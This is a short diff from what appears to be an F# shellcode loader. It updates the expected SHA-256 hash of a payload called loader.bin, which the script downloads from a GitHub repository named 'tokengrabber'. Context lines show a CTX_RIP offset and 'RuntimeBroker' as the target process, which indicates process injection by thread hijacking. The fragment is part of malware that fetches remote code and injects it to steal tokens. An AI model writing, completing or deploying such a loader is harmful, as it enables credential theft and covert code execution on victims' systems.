@@ -192,7 +192,7 @@ let CTX_RIP = 0xF8
 let shellcodeUrl =
     "https://api.github.com/repos/bielzxdev/tokengrabber/contents/loader.bin?ref=main"
 
-let expectedSha256 = "7B41431BE944BDB48B83C1C011DAA84CEF5B49F13614AF4569BAA4A2BC505ECA"
+let expectedSha256 = "16280D07DEE8258025F64EB71F550DC15090ADF5A4ED55A0B9107AE68CEAE8B4"
 let localShellcodePath = Path.Combine(__SOURCE_DIRECTORY__, "loader.bin")
 let targetProcessName = "RuntimeBroker"
 
